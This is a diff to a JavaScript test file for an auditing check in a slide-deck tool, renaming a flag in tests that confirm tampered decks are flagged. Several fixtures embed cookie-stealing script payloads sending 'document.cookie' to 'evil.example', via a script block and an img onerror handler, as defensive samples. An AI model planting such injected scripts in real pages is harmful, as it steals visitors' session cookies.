@@ -1,7 +1,7 @@
 // Copyright 2026 Gilles Philippart
 // SPDX-License-Identifier: Apache-2.0
 
-// The ingredients label (MARKETPLACE.md READ_ONLY#AUDIT). Two things have to
+// The ingredients label (MARKETPLACE.md NO_TRUST#AUDIT). Two things have to
 // hold at once and pull against each other: every executing block is named,
 // and nothing inert is. A label that cried wolf on cast JSON would be turned
 // off within a day, and one that missed an appended <script> is worse than
@@ -318,7 +318,7 @@ test('--check exits 0 on a deck that runs only the runtime', () => {
   const deck = path.join(dir, 'talk.html');
   const installed = installedRuntime();
   writeFileSync(deck, `<div class="decklight"></div><script>${installed.text}</script><script>Decklight.init()</script>`);
-  const { code, out } = run([deck, '--read-only', '--check']);
+  const { code, out } = run([deck, '--no-trust', '--check']);
   rmTemp(dir);
   assert.equal(code, 0);
   assert.match(out, /identical to this install/);
@@ -333,7 +333,7 @@ test('--check exits non-zero and names the block, from any directory', () => {
   const deck = path.join(dir, 'talk.html');
   writeFileSync(deck, `<script>var Decklight = {}</script><script>Decklight.init()</script>
 <script>fetch("//evil.example/" + document.cookie)</script>`);
-  const { code, out } = run([deck, '--read-only', '--check']);
+  const { code, out } = run([deck, '--no-trust', '--check']);
   rmTemp(dir);
   assert.equal(code, 1);
   assert.match(out, /1 unaccounted script block/);
@@ -347,7 +347,7 @@ test('--check exits non-zero on an inline handler, even with 0 unaccounted block
   const deck = path.join(dir, 'talk.html');
   writeFileSync(deck, `<script>var Decklight = {}</script><script>Decklight.init()</script>
 <img src=x onerror="fetch('//evil.example/' + document.cookie)">`);
-  const { code, out } = run([deck, '--read-only', '--check']);
+  const { code, out } = run([deck, '--no-trust', '--check']);
   rmTemp(dir);
   assert.equal(code, 1);
   assert.match(out, /0 unaccounted script blocks/, 'the block count is honest — there is no block');
@@ -361,12 +361,12 @@ test('--check on a real bundled deck is quiet, and loud once tampered with', () 
   const bundled = run(['bundle', path.join(ROOT, 'demo/intro.html'), '-o', deck]);
   assert.equal(bundled.code, 0, bundled.out);
 
-  const before = run([deck, '--read-only', '--check']);
+  const before = run([deck, '--no-trust', '--check']);
   assert.equal(before.code, 0, before.out);
   assert.match(before.out, /0 unaccounted/);
 
   writeFileSync(deck, readFileSync(deck, 'utf8') + '\n<script>alert(1)</script>\n');
-  const after = run([deck, '--read-only', '--check']);
+  const after = run([deck, '--no-trust', '--check']);
   rmTemp(dir);
   assert.equal(after.code, 1);
   assert.match(after.out, /alert\(1\)/);
@@ -374,12 +374,12 @@ test('--check on a real bundled deck is quiet, and loud once tampered with', () 
 
 test('every command that inlines the runtime produces bytes this install recognises', () => {
   // The label's whole job is to say whether the runtime in a file is this
-  // install's build (READ_ONLY#AUDIT), so a decklight command whose own output
+  // install's build (NO_TRUST#AUDIT), so a decklight command whose own output
   // audits as DIFFERS is the alarm going off on decklight itself. `import`
   // did exactly that: its local escape covered `</script` and `</style` but
   // not `<!--`, so every imported deck disagreed with the auditor by one
   // sequence — invisible in a render harness, and stated in the terminal to
-  // anyone who ran `decklight <deck> --read-only` on the result.
+  // anyone who ran `decklight <deck> --no-trust` on the result.
   //
   // Pinned as a property of the SHARED transform rather than of one command:
   // whatever `inlineRuntime` does, the auditor's model of it and the bytes a
